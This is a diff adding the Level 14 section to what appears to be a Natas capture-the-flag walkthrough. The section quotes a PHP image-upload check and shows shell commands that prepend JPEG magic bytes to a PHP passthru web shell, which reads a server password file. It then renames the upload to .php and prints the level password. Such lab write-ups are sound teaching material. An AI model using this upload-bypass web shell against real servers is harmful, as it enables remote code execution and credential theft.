@@ -464,6 +464,55 @@ Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 ---
 
 #### Level 14
+This level is very similar to the previous level but with one minor difference. As mentioned at the top of the site, "For security reasons, we now only accept image files!".
+
+Viewing the source code, there is one key difference compared to the previous level:
+
+```php
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+        echo "File is too big";
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+        echo "File is not an image";
+    } else {
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
+        } else{
+            echo "There was an error uploading the file, please try again!";
+        }
+    }
+}
+```
+
+In this snippet, you can see that there is now an extra check to determine if the uploaded file is an image or not via the `exif_imagetype()`. A quick search shows that [exif_imagetype](https://www.php.net/manual/en/function.exif-imagetype.php) reads the first byes of an image and checks its signature.
+
+It is possible to bypass this check by writing the first bytes of a script as the JPEG file signature and then appending the PHP code after. That way, it fools the function into returning the file type as JPEG.
+
+The JPEG file signature is `FF D8 FF E0` from the [List of File Signatures Wiki](https://en.wikipedia.org/wiki/List_of_file_signatures) or in the full format, `0xFF 0xD8 0xFF 0xE0`.
+
+```bash
+$ echo -e "\xFF\xD8\xFF\xE0" > script.php
+$ file script.php
+script.php: JPEG image data
+$ echo -n '<?php passthru("cat /etc/natas_webpass/natas14"); ?>' >> script.php
+$ file script.php
+script.php: JPEG image data
+```
+
+> Note that the flag `-e` enables the interpretion of backslash escapes as stated in the [echo](https://linux.die.net/man/1/echo) documentation. In this case, `\x` denotes the start of a hexadecimal character code. The `-n` is used to omit the trailing newline at the end which is important so that the file type remains to be seen as an image.
+
+Next, repeat the same steps as in [Level 13](#level-13) by first choosing the file, and then going into Developer Tools to change the extension to .php before uploading. Afterwards, navigate to the randomly generated filename in `uploads/`.
+
+Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
 
 ---
 
